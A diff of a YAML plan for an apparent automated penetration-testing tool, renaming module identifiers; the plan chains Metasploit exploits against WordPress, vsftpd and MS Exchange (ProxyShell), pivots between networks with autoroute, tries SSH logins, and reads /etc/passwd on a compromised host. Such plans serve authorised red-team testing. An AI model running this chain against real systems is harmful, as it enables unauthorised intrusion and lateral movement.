@@ -1,7 +1,7 @@
 ---
 # A pivoting example that first exploits a WordPress service and uses it to discover the next network.
 # It repeats the same process with other services (FTP, MS Exchange, SSH) that are in different networks.
-# Required modules: mod_msf, mod_cmd.
+# Required modules: metasploit, command.
 
 plan:
   name: Pivoting example
@@ -21,7 +21,7 @@ plan:
           step_type: worker/execute
           arguments:
             create_named_session: session-to-wordpress
-            module: mod_msf
+            module: metasploit
             module_arguments:
               module_type: exploit
               module: unix/webapp/wp_admin_shell_upload
@@ -42,7 +42,7 @@ plan:
             note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
           step_type: worker/execute
           arguments:
-            module: mod_msf
+            module: metasploit
             module_arguments:
               module_type: post
               module: multi/manage/autoroute
@@ -64,7 +64,7 @@ plan:
           is_init: true
           arguments:
             create_named_session: session-to-ftp
-            module: mod_msf
+            module: metasploit
             module_arguments:
               module_type: exploit
               module: unix/ftp/vsftpd_234_backdoor
@@ -82,7 +82,7 @@ plan:
             note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
           step_type: worker/execute
           arguments:
-            module: mod_msf
+            module: metasploit
             module_arguments:
               module_type: post
               module: multi/manage/autoroute
@@ -104,7 +104,7 @@ plan:
           is_init: true
           arguments:
             create_named_session: session-to-exchange
-            module: mod_msf
+            module: metasploit
             module_arguments:
               module_type: exploit
               module: exploit/windows/http/exchange_proxyshell_rce
@@ -124,7 +124,7 @@ plan:
             note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
           step_type: worker/execute
           arguments:
-            module: mod_msf
+            module: metasploit
             module_arguments:
               module_type: post
               module: multi/manage/autoroute
@@ -146,7 +146,7 @@ plan:
           step_type: worker/execute
           arguments:
             create_named_session: session-to-ssh
-            module: mod_msf
+            module: metasploit
             module_arguments:
               module_type: auxiliary
               module: scanner/ssh/ssh_login
@@ -164,6 +164,6 @@ plan:
           step_type: worker/execute
           arguments:
             use_named_session: session-to-ssh
-            module: mod_cmd
+            module: command
             module_arguments:
               cmd: cat /etc/passwd
